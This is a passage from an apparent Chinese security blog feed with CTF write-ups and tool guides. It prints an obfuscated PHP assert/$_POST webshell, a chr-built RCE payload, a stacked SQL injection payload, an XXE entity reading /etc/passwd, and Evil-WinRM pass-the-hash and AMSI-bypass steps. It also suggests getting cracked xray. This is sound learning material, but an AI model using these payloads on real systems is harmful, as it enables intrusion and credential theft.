class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure><p>再进行URL编码。</p><p>上面构造webshell 都是assert函数 在php5 和php7 中这个函数作用不同 可以使用代替函数 <strong>file_put_contents()</strong> <strong>call_user_func()</strong> <strong>system</strong></p><p>题目：来自[HNCTF 2022 Week1]Challenge__rce</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312092147727.png"></p><p>这题过滤了 取反 异或 还有长度限制。可以用到自增。如果用上面的思路明显长度太长。看了wp 可以用chr函数然后转为字母。所以要先构造chr单词。这里还用到了 php7的特性 (system)(ls) 这样也可以执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.[]; \\用之前的方法构造出 <span class="keyword">array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>]; \\取r单词</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>]; \\取a用于后面自增</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>; \\先自增再赋值成c</span><br><span class="line"><span class="variable">$_</span>++;\\ d</span><br><span class="line"><span class="variable">$_</span>++; \\e</span><br><span class="line"><span class="variable">$_</span>++;\\f</span><br><span class="line"><span class="variable">$_</span>++;\\g</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_1</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>; \\chr</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$_</span>(<span class="number">69</span>).<span class="variable">$_</span>(<span class="number">84</span>);\\ GET</span><br><span class="line"><span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);  \\<span class="variable">$GET</span>[<span class="number">1</span>](<span class="variable">$GET</span>[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再将上面的代码进行URL编码 分别 get 传参1和2的值</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312092204909.png"></p><p>属实汗流浃背了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp+xray联动漏扫</title>
      <link href="/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/"/>
      <url>/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="网上也有很多相关的文章，但还是想记录一下"><a href="#网上也有很多相关的文章，但还是想记录一下" class="headerlink" title="#网上也有很多相关的文章，但还是想记录一下"></a>#网上也有很多相关的文章，但还是想记录一下</h1><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>xray是长亭科技开发的一款漏洞扫描工具。除了基本的漏洞也可以添加其他的poc。</p><p>xray分为<a href="https://github.com/chaitin/xray">免费版</a>和付费版。至于付费版可以去网上找破解。</p><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>1.使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>2.使用 HTTP 代理进行被动扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>3.只扫描单个 url，不使用爬虫</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --url http://example.com/?a=b --html-output single-url.html</span><br></pre></td></tr></table></figure><h2 id="burp设置"><a href="#burp设置" class="headerlink" title="burp设置"></a>burp设置</h2><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021632873.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021630313.png"></p><p>不能和浏览器代理端口相同</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021658843.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021702003.png"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>先把如上配置配置好后。使用xray开启本地监听。在访问网页后会进行自动爬取漏洞扫描</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021707017.png"></p><h2 id="ps"><a href="#ps" class="headerlink" title="ps:"></a>ps:</h2><p>要扫描https网站要安装CA证书</p><p>xray:  运行 xray genca </p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FFUF工具</title>
      <link href="/2023/11/13/FFUF%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2023/11/13/FFUF%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="FFUF-一款模糊测试工具"><a href="#FFUF-一款模糊测试工具" class="headerlink" title="#FFUF 一款模糊测试工具"></a>#FFUF 一款模糊测试工具</h1><h2 id="FFUF功能"><a href="#FFUF功能" class="headerlink" title="FFUF功能"></a>FFUF功能</h2><p>1.进行虚拟主机子域名爆破</p><p>2.用户名密码爆破</p><p>3.目录爆破</p><h2 id="FFUF-详细参数"><a href="#FFUF-详细参数" class="headerlink" title="FFUF 详细参数"></a>FFUF 详细参数</h2><p>-w : 指定字典</p><p>-u：指定域名</p><p>-X：请求方式 （get post  put delete）</p><p>-e: 指定文件类型 （.html, .php,.txt）</p><p>-H: 添加数据包附加标头</p><p>-mc ：指定状态代码。</p><p>-ml：指定响应的行数</p><p>-mr：指定正则表达式模式</p><p>-ms：指定响应大小</p><p>-mw：指定响应的字数</p><p>-fw：按字数过滤</p><p>-fl：按行数过滤</p><p>-fs：按响应大小过滤</p><p>-fc：按状态代码过滤</p><p>-fr：按正则表达式模式过滤</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><h3 id="使用FFUF进行目录爆破"><a href="#使用FFUF进行目录爆破" class="headerlink" title="使用FFUF进行目录爆破"></a>使用FFUF进行目录爆破</h3><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311131158961.png"></p><p>使用以上参数时会发生误报</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311131200050.png"></p><p>这时需要用 -fs -fc  -fw  -fr -fl 中的一个进行过滤 我使用的fs 进行大小的过滤。恢复正常</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311131204498.png"></p><p>看看爆破的页面是否存在。大多都是301重定向。第一个目录被禁止访问</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311131208845.png"></p><h3 id="FFUF虚拟主机子域名爆破"><a href="#FFUF虚拟主机子域名爆破" class="headerlink" title="FFUF虚拟主机子域名爆破"></a>FFUF虚拟主机子域名爆破</h3><p>某些子域并不总是托管在可公开访问的DNS结果中，例如 Web 应用程序或管理门户的开发版本。相反，DNS 记录可以保存在私有 DNS 服务器上，或者记录在开发人员计算机上的 &#x2F;etc&#x2F;hosts 文件（对于 Windows 用户为 c:\windows\system32\drivers\etc\hosts 文件）中，该文件将域名映射到IP 地址。 </p><p>由于当客户端请求某个网站时，Web 服务器可以在一台服务器上托管多个网站，因此服务器可以从 Host <strong>标</strong>头中知道客户端想要哪个网站 。我们可以通过更改主机标头并监视响应来查看是否发现了新网站来利用该主机标头。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311251613127.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311251633810.png"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>打开一个网站，注册用户名提示该用户已被注册。可以根据提示信息枚举出用户名</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311251642768.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311251647357.png"></p><p>用户名枚举出来后，保存在一个文档中。开始进行密码爆破</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202311251659345.png"></p><p>我们使用FUZZ关键字来选择在请求中插入单词列表中的数据的位置，但由于我们使用多个单词列表，因此必须指定我们的自己的 FUZZ 关键字。在本例中，我们选择了W1有效用户名列表和W2我们将尝试的密码列表。多个单词列表再次用-w参数指定，但用逗号分隔。对于正匹配，我们使用-fc参数来检查 200 以外的 HTTP 状态代码。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2019 随便注</title>
      <link href="/2023/10/17/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2023/10/17/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：最近在学习ctf-遇到强网杯2019-记录一下。"><a href="#前言：最近在学习ctf-遇到强网杯2019-记录一下。" class="headerlink" title="#前言：最近在学习ctf,遇到强网杯2019,记录一下。"></a>#前言：最近在学习ctf,遇到强网杯2019,记录一下。</h1><h2 id="开局"><a href="#开局" class="headerlink" title="开局"></a>开局</h2><h2 id="打开环境后便有一个登陆框，尝试使用1’-进行sql注入测试。发现报错信息确认了存在sql注入。"><a href="#打开环境后便有一个登陆框，尝试使用1’-进行sql注入测试。发现报错信息确认了存在sql注入。" class="headerlink" title="打开环境后便有一个登陆框，尝试使用1’ 进行sql注入测试。发现报错信息确认了存在sql注入。"></a>打开环境后便有一个登陆框，尝试使用1’ 进行sql注入测试。发现报错信息确认了存在sql注入。</h2><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181551907.png"></p><p>进行列数数量的判断。 测试为2</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181552562.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181553459.png"></p><p>尝试 进行 union 注入。 发现 关键字被过滤掉了。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181555660.png"></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>进行堆叠注入的尝试。查询表名称  </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181559152.png"></p><p>发现两个表 words  1919810931114514   分别对两个表进行字段查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show  columns from words</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181608389.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181609176.png"></p><p>接下来就是骚操作了。因为通过传参1进去可以发现回显了两个信息，然而words表刚好有两个字段。 我们就可以把 1919…. 这个表名，字段名进行更改，更改为words,id 进行查询 .后台的 sql语句就应该是 select * form words where id &#x3D;1</p><p>在进行操作前需要知道sql语句的更改：</p><p>1.<code>alter table 表名 rename 新表名;</code></p><p>2.<code>alter table 表名 change 字段 新字段 数据类型; （alter table words change flag id varchar(60);）</code></p><p>构造 payload </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;alter table words rename words1;alter table `1919810931114514` rename words;alter table words change flag id varchar(60);#</span><br></pre></td></tr></table></figure><p>提交值后会发现没有结果空白，id 的值变成了 flag 的值 。所以只能让条件为真就可以返回flag 值 </p><p>1‘ or ‘1’&#x3D;1#</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181642765.png"></p><p>!<img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310181643116.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe漏洞学习</title>
      <link href="/2023/10/02/xee%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/10/02/xee%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="#前言："></a>#前言：</h1><p>今天学习了 xee漏洞的简单利用。为此记录一下。</p><h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>在学习xee漏洞开始前，要先了解xml文档的语法。</p><h3 id="什么是xml"><a href="#什么是xml" class="headerlink" title="什么是xml?"></a>什么是xml?</h3><p><strong>可延伸标记式语言</strong>（英语：E <strong>x</strong> tensible <strong>M</strong> arkup <strong>L</strong> anguage，简称：<strong>XML</strong>）是一种[标记式语言XML是从标准通用标记式语言（SGML）中简化修改出来的。它主要用到的有可延伸标记式语言、可延伸样式语言（XSL）、XBRL和XPath等。</p><p><code>xml</code>是互联网数据传输的重要工具，它可以跨越互联网任何的平台，不受编程语言和操作系统的限制，非常适合Web传输，而且xml有助于在服务器之间穿梭结构化数据，方便开发人员控制数据的存储和传输。</p><p>xml 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.XML元素都必须有关闭标签。</span><br><span class="line">2.XML 标签对大小写敏感。</span><br><span class="line">3.XML 必须正确地嵌套。</span><br><span class="line">4.XML 文档必须有根元素。</span><br><span class="line">5.XML 的属性值须加引号。</span><br></pre></td></tr></table></figure><h2 id="xee漏洞"><a href="#xee漏洞" class="headerlink" title="xee漏洞"></a>xee漏洞</h2><p>从所周知大部分漏洞基本都是通过用户可控参数进行传参，xee漏洞也是如此。</p><p>xxe的漏洞所在位置在DTD部分 ，而DTD相当于根，这个又分为 内部DTD文档 外部DTD文档 内外部DTD文档。</p><p>内部DTD文档</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素[定义内容]&gt;</span><br></pre></td></tr></table></figure><p>外部DTD文档</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure><p>内外部DTD文档结合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</span><br></pre></td></tr></table></figure><p>DTD文档里又包含了 实体部分。也分为 内部实体 和外部实体，参数实体。</p><p><code>XML</code>中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以利用如下协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url/file.ext</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure><p>内部实体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>一个实体由三部分构成: <code>&amp;</code>符号, 一个实体名称, 以及一个分号 <code>(;)</code></p><p>外部实体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>例如，一个内部DTD文档和内部实体的例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE xee [&lt;!ENTITY xss &quot;ofccie&quot;&gt;]&gt;    //这个根元素可以自定义，【】是实体内容</span><br><span class="line">&lt;xee&gt;&amp;xss;&lt;\xee&gt; 这个部分是 xml 部分 最后输出 ofccice</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用靶场能更直观的展示。</p><p>最底下部分就是xml 文档结构 。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310021555252.png"></p><p>这是个用户名重置的链接使用的xml 而bee这个是我们可以控制的。当我们点击发送响应回来的是。bee’s ….</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310021557547.png"></p><p>当我们把它改为xxx.</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310021559489.png"></p><p>试着去写一个DTD 文档 （如上举例）</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202310021602640.png"></p><p>当我们试着去写一个外部实体引用去读取本地文件。（由于靶场并不是安装在机器上，无法演示）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;！DOCTYPE xee [&lt;!ENTITY xss SYSTEM &quot;file:///etc//passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;xee&gt;&amp;xss;&lt;/xee&gt;</span><br></pre></td></tr></table></figure><p>上面是有回显，还存在无回显的情况。以及dos 攻击 内网探测。（后面在学😃,记笔记吧）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>evli-minwrm工具</title>
      <link href="/2023/09/04/evli-minwrm%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/09/04/evli-minwrm%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="做htb靶场时遇到了个重要的工具记录一下。（直接搬运国外文章😃）"><a href="#做htb靶场时遇到了个重要的工具记录一下。（直接搬运国外文章😃）" class="headerlink" title="#做htb靶场时遇到了个重要的工具记录一下。（直接搬运国外文章😃）"></a>#做htb靶场时遇到了个重要的工具记录一下。（直接搬运国外文章😃）</h1><h2 id="什么是-Evil-WinRM-❓"><a href="#什么是-Evil-WinRM-❓" class="headerlink" title="什么是 Evil-WinRM ❓"></a>什么是 Evil-WinRM ❓</h2><p>Evil-WinRM 是一种渗透工具，它利用 Windows 远程管理服务来获得对远程 Windows 系统的未经授权的访问。</p><p>它利用 WinRM 服务中存在的弱配置在目标 Windows 计算机上建立远程 shell 会话，从而允许攻击者执行管理任务并运行脚本。</p><p>由于 Linux 默认情况下未安装 PowerShell，因此我们将使用一个名为 Evil-WinRM 的工具，该工具是为这种情况而设计的。</p><h2 id="如何使用-Evil-WinRM-💡"><a href="#如何使用-Evil-WinRM-💡" class="headerlink" title="如何使用 Evil-WinRM 💡"></a>如何使用 Evil-WinRM 💡</h2><p>仅当远程目标系统中启用了 WinRM 服务时，才能使用 Evil-WinRM 工具。这可以通过使用 nmap 检查两个默认 winrm 服务端口 5985 和 5986 是否打开来确认。</p><h2 id="使用纯文本或哈希值登陆。"><a href="#使用纯文本或哈希值登陆。" class="headerlink" title="使用纯文本或哈希值登陆。"></a>使用纯文本或哈希值登陆。</h2><p>纯文本密码登陆：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip_address&gt; -u &lt;username&gt; -p &lt;password&gt;</span><br></pre></td></tr></table></figure><p>哈希值密码登陆：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip_address&gt; -u &lt;username&gt; -H &lt;Hash_Value&gt;</span><br></pre></td></tr></table></figure><p><strong>输入menu查看evil-winrm提供的所有功能</strong></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041627655.png"></p><h2 id="加载-Powershell-脚本"><a href="#加载-Powershell-脚本" class="headerlink" title="加载 Powershell 脚本"></a>加载 Powershell 脚本</h2><p>evil-winrm 的功能之一是它允许我们使用基础计算机上的脚本。我们可以使用 -s 选项以及存储在主机中的脚本文件的路径将脚本直接加载到内存中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip_address&gt; -u &lt;username&gt; -p &lt;password&gt; -s &lt;path_of_script&gt;</span><br></pre></td></tr></table></figure><p>它还具有默认情况下称为 Windows Defender 的 AMSI（反恶意软件扫描接口）功能，我们需要在导入任何脚本之前绕过该功能，以免被阻止。</p><p>首先，我们绕过 AMSI 并输入脚本名称。然后输入菜单并检查加载的功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bypass-4MSI</span><br><span class="line">PowerView.ps1 (the script name)</span><br><span class="line">menu</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041637695.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041638969.png"></p><h2 id="使用evil-winrm存储日志"><a href="#使用evil-winrm存储日志" class="headerlink" title="使用evil-winrm存储日志"></a>使用evil-winrm存储日志</h2><p>在获取远程会话后执行任务时，我们可以将日志保存到我们的基本系统中。这些日志可用作跟踪我们执行的任务的参考。这可以使用 -l 选项来完成。</p><p>此选项可用于任何 evil-winrm 远程会话，您只需添加 -l 选项即可将日志保存到主机的 &#x2F;root&#x2F;evil-winrm-logs 目录<strong>中</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip_address&gt; -u &lt;username&gt; -p &lt;password&gt; -l</span><br></pre></td></tr></table></figure><p>我在这里使用了 ipconfig 和 whoami 命令。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041644911.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041646263.png"></p><p>日志文件将包含日志的创建日期和时间。</p><h2 id="使用-Evil-winrm-运行可执行文件"><a href="#使用-Evil-winrm-运行可执行文件" class="headerlink" title="使用 Evil-winrm 运行可执行文件"></a>使用 Evil-winrm 运行可执行文件</h2><p>Evil-winrm 允许我们在 powershell 会话中运行可执行文件。我们将使用 -e 选项来使用 exe 可执行二进制文件。我们应该在-e选项之后指定可执行文件的路径。 </p><p>在这里，我正在执行存储在主机中的 winPEASx64.exe 可执行文件。并使用 evil-winrm 菜单中的 Invoke-Binary 运行它。</p><p>在运行可执行文件之前，请确保您已绕过 AMSI。</p><p>此功能将执行在命令行 shell 中运行的任何 exe 二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip_address&gt; -u &lt;username&gt; -p &lt;password&gt; -e &lt;path_of_executable&gt;</span><br><span class="line"></span><br><span class="line">Bypass-4MSI</span><br><span class="line">menu</span><br><span class="line"></span><br><span class="line">Invoke-Binary &lt;the path and exe file name&gt;</span><br><span class="line">Invoke-Binary /opt/privsc/winPEASx64.exe</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041650247.png"></p><p>WinPEASx64.exe用于Windows权限提升和审核。我们可以使用它来识别目标机器可能存在的漏洞。它还生成一份详细的报告，总结发现的漏洞和弱点。 </p><p>使用它我们可以获得有关目标系统的大量信息。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041653592.png"></p><p>系统基本信息：</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041655030.png"></p><p>用户环境信息：</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041658776.png"></p><p>用户信息：</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041656348.png"></p><p>还有许多更重要的东西……</p><h2 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h2><p>后期利用工具有时可能无法检测到目标系统中运行的服务名称，因此，我们可以使用evil-winrm来查找目标系统中运行的服务。 </p><p>为此，请转到菜单并使用服务功能。它将列出受感染的目标系统中运行的所有服务</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041708664.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041712439.png"></p><h2 id="使用evil-winrm进行文件传输"><a href="#使用evil-winrm进行文件传输" class="headerlink" title="使用evil-winrm进行文件传输"></a>使用evil-winrm进行文件传输</h2><p>我们可以将文件从基本系统传输到目标系统。这对于执行枚举非常有用，只需使用<strong>上传</strong>命令和文件名即可将其上传到目标系统。</p><p>在这里，我将一个名为 root.txt 的文件从基本系统的 root 用户主目录上传到目标系统的文档文件夹。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041714798.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/root.txt </span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041716416.png"></p><p>您可以使用 ls 命令进行验证。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041719429.png"></p><p>现在可以在目标系统的文档文件夹中看到该文件。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041721014.png"></p><p><strong>同样，我们也可以使用下载</strong>命令以及文件名并指定要下载文件的路径，将文件从目标系统下载到主机。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">download sample.txt /home/ruth/sample.txt</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041722149.png"></p><p>在这里，我首先更改了桌面路径并列出了那里存在的文件，然后下载了文本文件。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202309041723545.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>身份认证漏洞靶场</title>
      <link href="/2023/08/25/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/25/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="#学习记录"></a>#学习记录</h1><h2 id="什么是认证？"><a href="#什么是认证？" class="headerlink" title="什么是认证？"></a>什么是认证？</h2><p>认证是验证给定用户或客户端身份的过程。换句话说，它涉及确保他们确实是自己所声称的那个人。至少在某种程度上，网站在设计上是暴露给任何连接到互联网的人面前的。因此，强大的认证机制是有效Web安全的一个重要方面。</p><p>有三种认证因素，不同类型的认证可以被分类到这三种因素中：</p><p>- </p><p>  某种你所<strong>知道</strong>的东西，比如密码或安全问题的答案。有时被称为“知识因素”。</p><p>- </p><p>  某种你所<strong>拥有</strong>的东西，即像手机或安全令牌这样的实物。有时被称为“持有因素”。</p><p>- </p><p>  你<strong>是什么</strong>或做什么，例如你的生物特征或行为模式。有时被称为“固有因素”。</p><p>认证机制依赖于一系列技术来验证这些因素中的一个或多个。</p><h2 id="认证和授权之间的区别"><a href="#认证和授权之间的区别" class="headerlink" title="认证和授权之间的区别"></a>认证和授权之间的区别</h2><p>认证是验证一个用户是否真的<strong>是他们声称的那个人</strong>的过程，而授权则是验证用户是否<strong>被允许做某事</strong>。</p><p>在一个网站或Web应用程序中，认证确定试图使用用户名<code>Carlos123</code>访问网站的人是否确实是创建该账户的同一个人。</p><p>一旦<code>Carlos123</code>通过认证，他的权限就决定了他是否被授权，例如，访问其他用户的个人信息，或者执行删除其他用户账户等操作。</p><h2 id="认证漏洞如何产生的？"><a href="#认证漏洞如何产生的？" class="headerlink" 